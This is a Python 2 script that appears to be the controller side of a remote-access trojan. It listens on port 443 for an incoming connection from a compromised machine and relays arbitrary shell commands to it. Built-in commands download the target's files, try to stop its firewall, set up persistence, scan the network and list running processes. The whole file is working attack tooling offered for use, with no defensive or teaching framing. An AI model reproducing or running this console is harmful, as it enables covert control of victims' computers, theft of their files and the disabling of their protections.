# -*- coding: UTF-8 -*-

import socket 
import os

def server():
    try:
        os.system('cls')
    except:
        os.system('clear')
        
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 443))
    s.listen(2)
    print "Socket created..."
    print "Listening on port 443... "
    (client, (ip, port)) = s.accept()
    print "Received connection from : ", ip
     

    print 'Program Commands:\n\n os info\tType "os info" to get information about\
 the system\n'
    print ' download \tType "download <file_to_download>" to download the target file\n'
    print ' firewall \tType "firewall" to try and stop the firewall \n'
    print ' help/-?/-h \tType "help" to display (this) help and other commands\n'
    print ' persistence \tType "persistence" to try and create the persistence \n'
    print ' quit \t\tType "quit" to exit the program and close the connection.\n'
    print ' scanner \tType "scanner" to scan the network\n'
    print ' tasks \t\tType "tasks" to display the current processes of the remote device\n'
    print 'You can also execute any command that you want.\nBe careful to run an \
appropriate command according to the operating system.'

     
    while True:
        command = raw_input('~$ ')
        client.send(command)
        data = ''
        # data=client.recv(2048)
        # print data
        if command == 'quit':
            break
            
            
        elif command == 'help':
                print 'Program Commands:\n\n os info\t\tType "os info" to get information about\
                the system\n'
                print ' download \tType "download <file_to_download>" to download the target file\n'
                print ' firewall \tType "firewall" to try and stop the firewall \n'
                print ' help/-?/-h \tType "help" to display (this) help and other commands\n'
                print ' persistence \tType "persistence" to try and create the persistence \n'
                print ' quit \t\tType "quit" to exit the program and close the connection.\n'
                print ' scanner \tType "scanner" to scan the network\n'
                print ' tasks \t\tType "tasks" to display the current processes of the remote device\n'
                print 'You can also execute any command that you want.\nBe careful to run an \
                appropriate command according to the operating system.'
        
        
        elif command.split(' ')[0] == 'download':
            #download <fichero_objetivo>
            file = command.split(' ')[1]
            dir, filename = os.path.split(file)
            downloadDir = 'c:\\download\\'
            
            #AL PONERLO A 1024BYTES (1Kb) Y SER EL ARCHIVO MUCHO MENOR NO ENTRABA EN EL BUCLE
            #AL PONERLO A 10BYTES Y EL ARCHIVO TENER 193, ENVIABA 19 PAQUETES Y DEJABA SIN COPIAR 3 PAQUETES.
            #ESO ES INTOLERABLE YA QUE SE NECESITA EL FICHERO COMPLETO. POR ELLO, LA MEJOR OPCION QUE NOS QUEDA
            #ES IR BYTE A BYTE!
            buffer = 1024
            data = client.recv(buffer)
            with open(os.path.join(downloadDir,filename), 'wb') as f:
                while len(data) >= 0:
                    if len(data) < buffer:
                        #ULTIMO PAQUETE
                        f.write(data)
                        break
                    else:
                        f.write(data)
                        data = client.recv(buffer)
                f.close()
            
            
           
        
        elif command == 'tasks':
            data = client.recv(1024*10)
            print data
            data = ''



        elif command == '':
            print 'Escribe un comando'
        

        
        else:
            buffer = 1024
            data = client.recv(buffer)
            print data
            
            # while (data):
                # print data
                # data = client.recv(buffer)
                # if len(data)<buffer:
                    # break
                # elif not (data):
                    # break

            
        data = ''
    client.close()
    s.close()
    
server()
